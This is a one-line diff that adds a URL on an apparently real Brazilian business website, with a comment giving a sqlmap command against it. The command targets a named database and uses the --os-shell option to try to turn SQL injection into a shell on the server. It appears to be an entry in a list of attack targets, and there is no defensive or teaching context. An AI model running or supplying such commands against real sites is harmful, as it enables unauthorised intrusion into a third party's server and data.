@@ -1,0 +1,1 @@
+http://www.ceodiesel.com.br/index.php?pg=pg&i=57 (GET)  # sqlmap.py -u http://www.ceodiesel.com.br/index.php?pg=pg&i=57 -D ceodiesel --threads 5 -v3 --random-agent  --os-shell
